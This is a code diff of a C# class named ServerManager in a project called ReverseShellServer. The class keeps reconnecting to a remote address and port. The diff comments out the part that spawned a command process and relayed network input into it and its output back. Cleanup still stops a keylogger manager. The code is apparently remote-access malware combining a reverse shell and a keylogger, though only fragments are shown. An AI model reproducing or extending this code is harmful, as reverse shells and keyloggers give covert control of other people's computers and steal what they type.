@@ -1,18 +1,16 @@
 ﻿using Commands;
 using NetworkManager;
+using Shared;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
 using System.Linq;
-using System.Text;
 using System.Threading;
 
 namespace ReverseShellServer
 {
     public class ServerManager
     {
-        Process processCmd { get; set; }
+        // Process processCmd { get; set; }
 
 
         public ServerManager()
@@ -31,7 +29,7 @@ namespace ReverseShellServer
             while (true)
             {
                 RunServer(remoteAdress, remotePort);
-                Thread.Sleep(retryDelay);           //Wait for a time and try again
+                Thread.Sleep(retryDelay);           //Wait for the given time and try again
             }
         }
 
@@ -43,7 +41,7 @@ namespace ReverseShellServer
                 return;
             }
 
-            processCmd = new Process
+            /*processCmd = new Process
             {
                 StartInfo =
                 {
@@ -60,7 +58,7 @@ namespace ReverseShellServer
             processCmd.Start();
             processCmd.BeginOutputReadLine();
 
-            SayHelloToCmd();
+            SayHelloToCmd();*/
 
             while (true)
             {
@@ -99,16 +97,16 @@ namespace ReverseShellServer
                 {
                     StopServer();
                 }
-                SayHelloToCmd();
-            }
+                //SayHelloToCmd();
+            }/*
             else
             {
                 processCmd.StandardInput.WriteLine($"{receivedData}\n");
-            }
+            }*/
         }
 
 
-        void SayHelloToCmd() => processCmd.StandardInput.WriteLine("Hello !\n");
+        //void SayHelloToCmd() => processCmd.StandardInput.WriteLine("Hello !\n");
 
 
         /// <summary>
@@ -116,7 +114,7 @@ namespace ReverseShellServer
         /// </summary>
         /// <param name="sendingProcess"></param>
         /// <param name="outLine"></param>
-        void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        /*void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             var output = outLine.Data;
             if (string.IsNullOrEmpty(outLine.Data)) return;
@@ -142,14 +140,14 @@ namespace ReverseShellServer
             {
                 // ignored
             }
-        }
+        }*/
 
 
         void Cleanup()
         {
             try
             {
-                processCmd.Kill();
+                //processCmd.Kill();
                 MainWindow.keyLoggerManager.Stop();
                 GlobalNetworkManager.ServerNetworkManager.Cleanup();
             }
